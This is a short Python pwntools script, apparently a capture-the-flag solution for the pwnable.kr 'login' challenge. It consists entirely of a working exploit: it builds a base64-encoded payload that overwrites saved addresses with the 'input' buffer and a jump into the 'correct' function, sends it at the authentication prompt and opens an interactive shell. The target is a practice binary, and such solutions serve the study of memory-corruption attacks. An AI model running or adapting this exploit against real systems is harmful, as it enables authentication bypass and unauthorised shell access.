from pwn import *

r = process("./login")
# r = remote("pwnable.kr", 9003)
input_addr = ELF("./login").sym["input"]
shell_addr = ELF("./login").sym["correct"] + 37
payload = cyclic(4) + p32(shell_addr) + p32(input_addr)
payload = b64e(payload)
r.sendlineafter("Authenticate : ", payload)
r.interactive()